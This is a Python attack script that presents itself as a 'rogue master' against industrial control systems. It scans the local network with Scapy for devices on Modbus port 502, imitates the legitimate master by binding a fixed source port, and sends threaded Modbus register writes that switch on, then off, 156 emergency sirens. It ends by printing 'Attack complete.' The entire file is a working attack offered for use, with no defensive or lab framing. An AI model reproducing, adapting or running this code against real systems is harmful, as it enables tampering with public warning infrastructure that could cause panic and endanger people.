import socket
import struct
import time
import threading
import scapy.all as scapy  # Use Scapy for network scanning and packet crafting
import ipaddress

# Configuration (Adjust these based on your specific environment)
PLC_DEFAULT_PORT = 502  # Standard Modbus port.  Adjust if needed.
ROGUE_MASTER_LISTEN_PORT = 502  # Port for the rogue master to listen on. Should be different from legitimate master, but often isn't.
SPOOFED_SOURCE_PORT = 2000 # Port the rogue master will use as source to mimic legitimate master
COMMAND_DELAY = 1  # Seconds to wait between sending commands
TARGET_SIREN_COUNT = 156 #Number of sirens to target, will send commands in parallel to this amount of devices
# You may want to configure this with a larger number of threads and commands sent depending on network environment


# --- PLC Discovery Functions ---
def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the local network.
    This uses Scapy for ARP scanning.  Requires root/administrator privileges.
    Returns:
        str: The PLC's IP address if found, otherwise None.
    """
    try:
        # Determine the network address and subnet mask of the current machine.
        # Assumes the network interface used for communication is the default route.
        # This part relies on Scapy's `conf.route` to get the default route.  If that fails, it needs to be manually configured.

        if scapy.conf.route is None or scapy.conf.route.route("0.0.0.0")[2] is None:
            print("Error: Could not automatically determine network interface and gateway. Please manually configure interface and gateway for ARP scanning using scapy.conf.iface and scapy.conf.route")
            return None

        network_interface = scapy.conf.route.route("0.0.0.0")[2] # the interface name
        network_address = scapy.conf.route.route("0.0.0.0")[0]  #The default route address
        network_mask = scapy.conf.route.route("0.0.0.0")[3]  #The netmask

        #Combine network and netmask into a single network address
        network = ipaddress.ip_interface(f"{network_address}/{network_mask}")

        # Create an ARP request to the broadcast address of the network.
        arp_request = scapy.ARP(pdst=str(network.network_address + 255))  # Broadcast address
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet broadcast address
        packet = ether/arp_request

        # Send the packet and capture the responses.  Timeout after 3 seconds.
        result = scapy.srp(packet, timeout=3, iface=network_interface, verbose=False)[0]

        # Check the responses for a possible PLC IP address.  This is a basic heuristic; improve as needed.
        for sent, received in result:
            ip_address = received.psrc
            try:
                # Attempt to connect to the IP address on the default Modbus port to confirm it's a PLC.
                # This is a rudimentary check.  More sophisticated identification may be necessary.
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)  # Short timeout
                s.connect((ip_address, PLC_DEFAULT_PORT))
                s.close()
                print(f"Found PLC candidate: {ip_address}")  #Debugging purposes
                return ip_address #if it gets here, it can connect to the PLC, therefore it most likely is the PLC
            except (socket.timeout, socket.error):
                # Ignore timeout or connection errors; it might not be a PLC.
                print(f"Connection to {ip_address} on port {PLC_DEFAULT_PORT} failed. Assuming not PLC.  Continue scanning")#Debugging purposes

        print("PLC IP address not found.") #Debugging purposes
        return None

    except Exception as e:
        print(f"Error during PLC IP discovery: {e}")
        return None


# --- Rogue Master Functions ---

def build_modbus_packet(transaction_id, unit_id, function_code, data):
    """
    Builds a Modbus TCP/IP packet.
    Args:
        transaction_id (int): The Modbus transaction identifier.
        unit_id (int): The Modbus unit identifier (slave address).
        function_code (int): The Modbus function code.
        data (bytes): The Modbus data payload.

    Returns:
        bytes: The complete Modbus TCP/IP packet.
    """
    protocol_id = 0  # Modbus TCP/IP protocol ID
    length = len(data) + 2  # Length of the remaining packet (excluding MBAP)
    header = struct.pack(">HHHB", transaction_id, protocol_id, length, unit_id)
    return header + struct.pack("B", function_code) + data



def send_command(target_ip, transaction_id, unit_id, function_code, data):
    """
    Sends a Modbus command to the PLC, spoofing the master's source port.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Bind to a specific local port to spoof the master's source port.
        sock.bind(('0.0.0.0', SPOOFED_SOURCE_PORT))
        sock.connect((target_ip, PLC_DEFAULT_PORT))

        packet = build_modbus_packet(transaction_id, unit_id, function_code, data)
        sock.sendall(packet)

        # (Optional) Receive response from the PLC.  This is important for many protocols.
        # response = sock.recv(1024)
        # print(f"Received response: {response.hex()}")

    except Exception as e:
        print(f"Error sending command to {target_ip}: {e}")
    finally:
        sock.close()


def control_siren(target_ip, siren_id, action):
    """
    Sends a command to control a specific siren.
    This is a simplified example.  The actual commands will depend on the siren protocol.
    """
    transaction_id = int(time.time())  # Generate a unique transaction ID
    unit_id = 1  #  PLC Unit ID to match configuration
    if action == "activate":
        function_code = 6  # Write Single Register (Example) - modify as needed
        register_address = 2000 + siren_id # Adjust based on siren configuration
        register_value = 1 #Activate siren
        data = struct.pack(">HH", register_address, register_value)

    elif action == "deactivate":
        function_code = 6  # Write Single Register (Example) - modify as needed
        register_address = 2000 + siren_id # Adjust based on siren configuration
        register_value = 0 #Deactivate siren
        data = struct.pack(">HH", register_address, register_value)
    else:
        print("Invalid action.  Choose 'activate' or 'deactivate'.")
        return

    send_command(target_ip, transaction_id, unit_id, function_code, data)
    print(f"Sent command to siren {siren_id} on {target_ip} to {action}")

def threaded_siren_control(target_ip, start_siren, num_sirens, action):
    """
    Controls a range of sirens in a threaded manner.

    Args:
        target_ip (str): The IP address of the PLC.
        start_siren (int): The starting siren ID.
        num_sirens (int): The number of sirens to control.
        action (str): The action to perform ("activate" or "deactivate").
    """

    threads = []
    for siren_id in range(start_siren, start_siren + num_sirens):
        thread = threading.Thread(target=control_siren, args=(target_ip, siren_id, action))
        threads.append(thread)
        thread.start()

        time.sleep(0.1)  # Small delay between thread starts to prevent overwhelming the system

    for thread in threads:
        thread.join()  # Wait for all threads to complete

# --- Main ---
if __name__ == "__main__":
    # 1. PLC Discovery
    plc_ip = find_plc_ip()

    if not plc_ip:
        print("PLC IP address not found. Exiting.")
        exit()

    print(f"Using PLC IP address: {plc_ip}")

    # 2.  Configure and Send Commands.  This is where the attack logic goes.
    # Example: Activate all sirens

    start_siren = 1 #Starting siren ID
    sirens_per_thread = TARGET_SIREN_COUNT #sirens per thread

    #Activate the siren
    threaded_siren_control(plc_ip,start_siren, sirens_per_thread,"activate")
    time.sleep(COMMAND_DELAY)

    #Deactivate the sirens
    threaded_siren_control(plc_ip,start_siren, sirens_per_thread,"deactivate")

    print("Attack complete.")